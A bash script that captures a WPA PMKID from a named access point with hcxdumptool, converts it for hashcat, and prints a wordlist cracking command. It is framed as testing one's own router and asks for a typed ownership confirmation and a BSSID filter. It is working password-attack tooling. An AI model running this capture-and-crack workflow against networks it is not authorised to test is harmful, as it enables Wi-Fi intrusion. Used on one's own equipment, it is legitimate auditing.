#!/usr/bin/env bash
#
# pmkid_capture.sh — capture a PMKID from YOUR OWN AP (the "clientless" attack).
#
# WHY THIS IS INTERESTING (vs. the 4-way handshake):
#   Some APs include a PMKID in the first EAPOL message of association. The PMKID
#   is derived from the PMK (your passphrase-derived master key), the AP MAC and
#   the client MAC. If the AP offers it, you can grab it WITHOUT waiting for a
#   real client to connect and WITHOUT any deauth — just by associating yourself.
#   Like the handshake, it only lets you TEST guesses offline; it never reveals
#   the password, and a strong passphrase stays safe. Not all APs are vulnerable
#   (it depends on the AP), which is itself a useful thing to discover about your
#   own router.
#
# Uses hcxdumptool (capture) + hcxpcapngtool (convert to hashcat 22000).
#
#   sudo bash wifi/pmkid_capture.sh --iface wlan1mon --bssid AA:BB:CC:DD:EE:FF \
#        [--out captures/pmkid] [--seconds 60]
#
# Requires monitor mode:  sudo bash wifi/monitor_mode.sh start wlan1
set -euo pipefail

if [[ $EUID -ne 0 ]]; then echo "Run as root." >&2; exit 1; fi

IFACE="" BSSID="" OUT="captures/pmkid" SECONDS_RUN=60 CHANNEL=""

while [[ $# -gt 0 ]]; do
  case "$1" in
    --iface)   IFACE="$2"; shift 2;;
    --bssid)   BSSID="$2"; shift 2;;
    --channel) CHANNEL="$2"; shift 2;;
    --out)     OUT="$2"; shift 2;;
    --seconds) SECONDS_RUN="$2"; shift 2;;
    -h|--help) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0;;
    *) echo "Unknown option: $1" >&2; exit 1;;
  esac
done

if [[ -z "$IFACE" || -z "$BSSID" ]]; then
  echo "Need --iface (monitor) and --bssid (YOUR AP). See --help." >&2
  exit 1
fi
command -v hcxdumptool >/dev/null || { echo "Install hcxdumptool (Kali: apt install hcxdumptool)." >&2; exit 1; }

cat <<EOF

  About to attempt PMKID capture from AP:  $BSSID  on $IFACE
  Do this ONLY on an access point you own or are authorized to test.

EOF
read -r -p "  Type YES if this AP is yours: " CONFIRM
[[ "$CONFIRM" == "YES" ]] || { echo "Aborted."; exit 1; }

mkdir -p "$(dirname "$OUT")"
PCAP="${OUT}.pcapng"

# hcxdumptool changed its CLI completely between 6.x and 7.x, so detect version.
HCXVER=$(hcxdumptool --version 2>/dev/null | grep -oE '[0-9]+\.[0-9]+' | head -1)
HCXMAJ=${HCXVER%%.*}
echo "[*] hcxdumptool version: ${HCXVER:-unknown}"
echo "[*] Capturing to $PCAP for ${SECONDS_RUN}s (restricted to $BSSID)…"

if [[ "${HCXMAJ:-0}" -ge 7 ]]; then
  # --- hcxdumptool 7.x ---
  # -w write pcapng, -c channel, and a COMPILED BPF that limits targeting to
  # ONLY your AP (addr3 = BSSID) so neighbours are never touched. PMKID rides in
  # EAPOL M1, so this works even when PMF blocks deauth.
  BPF="$(mktemp)"; trap 'rm -f "$BPF"' EXIT
  if ! hcxdumptool --bpfc="wlan addr3 ${BSSID}" > "$BPF" 2>/dev/null; then
    echo "[!] Could not compile BPF filter; aborting to avoid unscoped capture." >&2
    exit 1
  fi
  # hcxdumptool 7.x ARMS the radio itself and refuses an interface already put
  # into monitor mode by airmon-ng ("failed to arm / shared interface"). Hand it
  # a managed interface instead; NetworkManager is already stopped by
  # monitor_mode.sh, so nothing will fight us for it.
  echo "[*] Resetting $IFACE to managed so hcxdumptool 7.x can arm it itself…"
  nmcli dev set "$IFACE" managed no >/dev/null 2>&1 || true
  ip link set "$IFACE" down 2>/dev/null || true
  iw dev "$IFACE" set type managed 2>/dev/null || true
  ip link set "$IFACE" up 2>/dev/null || true

  CH_ARG=(); [[ -n "$CHANNEL" ]] && CH_ARG=(-c "$CHANNEL")
  echo "[*] (7.x) hcxdumptool -i $IFACE -w $PCAP ${CH_ARG[*]} --bpf=<yourAP>"
  timeout "${SECONDS_RUN}s" hcxdumptool -i "$IFACE" -w "$PCAP" \
    "${CH_ARG[@]}" --bpf="$BPF" --rds=1 \
    || echo "[*] hcxdumptool exited (timeout reached or interrupted)."
else
  # --- hcxdumptool 6.2.x ---
  FILTER="$(mktemp)"; trap 'rm -f "$FILTER"' EXIT
  echo "${BSSID//:/}" > "$FILTER"     # 6.x wants the MAC without colons
  timeout "${SECONDS_RUN}s" hcxdumptool -i "$IFACE" -o "$PCAP" \
    --filterlist_ap="$FILTER" --filtermode=2 --enable_status=3 \
    || echo "[*] hcxdumptool exited (timeout or version flag mismatch)."
fi

echo
echo "[*] Converting to hashcat 22000 format…"
OUT22000="${OUT}.hc22000"
if hcxpcapngtool -o "$OUT22000" "$PCAP" 2>/dev/null && [[ -s "$OUT22000" ]]; then
  echo "[OK] Wrote $OUT22000"
  grep -q '^WPA\*01' "$OUT22000" 2>/dev/null && echo "     Contains a PMKID (type 01)."
  grep -q '^WPA\*02' "$OUT22000" 2>/dev/null && echo "     Contains an EAPOL handshake (type 02)."
  echo "     Crack it:  hashcat -m 22000 $OUT22000 /usr/share/wordlists/rockyou.txt"
  echo "     or:        sudo bash wifi/crack_handshake.sh --cap $PCAP --engine hashcat"
else
  echo "[!] No PMKID/handshake extracted. Your AP may not expose a PMKID —"
  echo "    that's fine; fall back to wifi/capture_handshake.sh (4-way handshake)."
fi
